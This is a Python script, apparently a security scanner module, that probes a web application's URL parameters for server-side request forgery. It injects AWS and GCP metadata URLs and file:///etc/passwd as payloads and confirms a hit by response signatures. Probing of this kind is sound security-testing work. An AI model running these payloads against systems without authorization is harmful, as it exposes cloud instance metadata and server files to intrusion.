#!/usr/bin/env python3
"""
ssrf-test.py — server-side request forgery probe (signature-based), JSON out for the HUNTR engine.

For AUTHORIZED testing. Injects well-known internal/metadata/file targets into URL-ish GET
parameters and confirms SSRF only on a DEFINITIVE signature in the response (AWS/GCP metadata
fields, or /etc/passwd 'root:x:') — very low false-positive. Conservative + non-destructive:
it reads the metadata *index* / passwd, never credential paths, and performs no writes.

Usage:  ssrf-test.py --url "https://t/p?url=x" [--token "Bearer x"] [--json]
Emits:  {"findings":[{"severity","param","target","verdict","detail","url"}], "tested":true}
"""
import sys, json, urllib.request, urllib.parse, re

def arg(n, d=None):
    return sys.argv[sys.argv.index(n) + 1] if n in sys.argv else d

URL = arg("--url"); TOKEN = arg("--token"); TIMEOUT = int(arg("--timeout", "9") or 9)
URLISH = ("url", "uri", "path", "dest", "callback", "webhook", "fetch", "load", "src", "target",
          "feed", "host", "domain", "site", "proxy", "redirect", "return", "next", "continue", "image", "img", "file")
PROBES = [
    ("http://169.254.169.254/latest/meta-data/", re.compile(r"\b(ami-id|instance-id|iam/|public-keys|hostname|security-credentials)\b"), "AWS instance metadata (IMDS)"),
    ("http://metadata.google.internal/computeMetadata/v1/", re.compile(r"computeMetadata|project-id|service-accounts", re.I), "GCP metadata"),
    ("file:///etc/passwd", re.compile(r"root:.*:0:0:"), "local file read (file://)"),
]

def out(d):
    print(json.dumps(d)); sys.exit(0)

if not URL or "?" not in URL or "=" not in URL.split("?", 1)[1]:
    out({"findings": [], "tested": False, "error": "no query parameters to test"})

def fetch(u):
    req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0 HUNTR"})
    if TOKEN:
        req.add_header("Authorization", TOKEN if TOKEN.lower().startswith("bearer") else "Bearer " + TOKEN)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.read(100000).decode("utf-8", "ignore")
    except Exception as e:
        body = getattr(e, "read", None)
        try:
            return body().decode("utf-8", "ignore") if body else ""
        except Exception:
            return ""

try:
    parts = urllib.parse.urlparse(URL)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    findings = []
    for i, (k, _v) in enumerate(qs):
        if k.lower() not in URLISH:
            continue
        for target, sig, label in PROBES:
            nq = qs[:]; nq[i] = (k, target)
            u2 = urllib.parse.urlunparse(parts._replace(query=urllib.parse.urlencode(nq, safe=":/.")))
            body = fetch(u2)
            if body and sig.search(body):
                findings.append({"severity": "h", "param": k, "target": target, "verdict": "confirmed",
                                 "detail": "Parameter '%s' fetched %s and the response leaked %s — server-side request forgery confirmed." % (k, target, label),
                                 "url": URL})
                break
    out({"findings": findings, "tested": True})
except Exception as e:
    out({"findings": [], "tested": False, "error": str(e)[:120]})
